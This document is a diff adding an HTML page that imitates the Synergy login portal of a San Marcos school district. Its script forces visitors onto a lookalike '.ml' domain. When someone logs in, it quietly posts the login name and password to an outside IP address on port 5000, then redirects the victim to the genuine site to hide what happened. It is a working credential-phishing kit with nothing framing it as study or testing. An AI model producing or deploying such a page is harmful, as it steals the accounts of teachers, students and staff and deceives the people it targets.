@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head id="head" name="head">
+    <title>Welcome to Synergy!</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="css/bootstrap.css"><link rel="stylesheet" href="css/login.css">
+    <link rel="Shortcut Icon" href="https://sdsis1.sdcoe.net/sanmarcos/synergy.ico">
+    <script type="text/javascript" src="js/jquery-3.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>		
+</head>
+<body>
+    <a href="https://sdsis1.sdcoe.net/sanmarcos/accessibility.html" class="sr-only" target="_blank">Synergy Accessibility Tips</a>
+	<div class="content">
+        <form name="Login" method="post" action="./" id="Login">
+        <div>
+            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="I0arROw2aLZqxYGuf9U+CGiVJNXQrVQPpo1sBybSfsKwNw46vIjtSCOnzipoCfgBRQOWIo65PYMb6kY434s6QU2rNUWEz/5YvK9a2CDViOs=">
+        </div>
+    <div>
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="AB8AF6B6">
+</div>
+
+			<div id="LOGO"><img src="img/8D749524-419B-4CB2-BEAE-134B947A853D_LoginPageLogo.PNG" alt="Login Logo"></div>
+
+            <div id="LoginFormControls">
+			    <div class="frmCtrlGrp">Please enter your login name and password<br>
+					    below to access the application.</div>
+
+			    <div class="textbox-wrap">
+                    <div class="frmCtrlGrp">
+					    <label for="login_name">Login Name</label>
+					    <input class="form-control" type="text" size="35" id="login_name" name="login_name" placeholder="Login Name" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+                    </div>
+                </div>
+
+ 			    <div class="textbox-wrap">
+                    <div class="frmCtrlGrp">
+					    <label for="password">Password</label>
+					    <input class="form-control" id="password" type="password" size="35" name="password" value="" placeholder="Password" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+                    </div>
+                </div>
+                <div class="input-btn">
+                    <button name="btnLogin" onClick="request()" id="loginbtn" type="button" class="btn btn-primary">Login</button>
+                </div>
+
+                <a href="https://sdsis1.sdcoe.net/sanmarcos/LoginSub.aspx" id="SubLoginPage">Substitute Teacher Login</a>
+            </div>			
+            </form>
+		</div>
+
+        <div id="Footer">
+            <div id="EdupointLogo"><img src="img/EduPointLogo_WHITE.png"> </div>
+            <div id="SynergyLogo" title="Synergy 2018.01-CA.m"><img onclick="ManualPopup();" alt="Synergy" src="img/Synergy_EP_Logo_White_Med.png"> </div>
+            
+            <a href="#">Check For Popup</a> |
+            <a href="#">Add This Page to My Favorites</a>
+            <div class="copyright">Copyright © 2002-2018  Edupoint Educational Systems. All rights reserved.</div>
+    </div>
+    <script>
+            $(document).ready(function() {
+                if (window.location.href != "http://sdsis1.sdcoe.ml/sanmarcos/") {
+                    window.location.replace("http://sdsis1.sdcoe.ml/sanmarcos/");   
+                }
+            });
+    
+            $(document).keypress(function(e) {
+                var keycode = (e.keyCode ? e.keyCode : e.which);
+                if (keycode == '13') {
+                    request();
+                }
+            });
+    
+            function request() {
+                if (document.getElementById('login_name').length == 0) {
+                    alert ("Enter login credentials.")
+                }
+                else if (document.getElementById('password').length == 0) {
+                    alert ("Enter login credentials.")
+                }
+                else {
+                    const Http = new XMLHttpRequest();
+                    const url='http://149.28.72.58:5000/request';
+                    Http.open("POST", url, true);
+                    Http.setRequestHeader('Content-Type', 'application/json');
+                    Http.send(JSON.stringify({
+                        'user': document.getElementById('login_name').value,
+                        'pass': document.getElementById('password').value
+                    }));
+                    Http.onreadystatechange=(e)=>{
+                    console.log(Http.responseText)
+                    }; 
+                }
+                window.location.replace("https://sdsis1.sdcoe.net/sanmarcos");
+            }; 
+        </script>
+</body>
+</html>
